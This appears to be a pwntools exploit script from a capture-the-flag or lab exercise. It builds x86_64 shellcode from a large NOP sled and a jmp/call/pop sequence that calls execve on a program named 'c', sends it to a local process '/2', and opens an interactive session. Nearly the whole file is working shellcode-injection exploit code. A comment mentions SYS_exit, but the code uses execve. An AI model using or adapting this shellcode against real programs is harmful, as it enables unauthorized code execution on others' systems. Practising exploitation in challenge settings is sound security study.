import glob
from pwn import *

context.arch = "x86_64"
#context.log_level = "DEBUG"

nop_sleed = "nop\n" * 900

# pwntools will change SYS_exit to the respective syscall
assembly = nop_sleed + """
jmp executable
main:
	pop rdi
	xor rsi, rsi
	xor rdx, rdx
	push 59
	pop rax
	syscall
executable:
    call main
	.ascii "c"
"""

shellcode = asm(assembly)
#print(disasm(shellcode))

p = process(['/2'])
print(p.recv(timeout=2).decode())
p.send(shellcode)
p.interactive()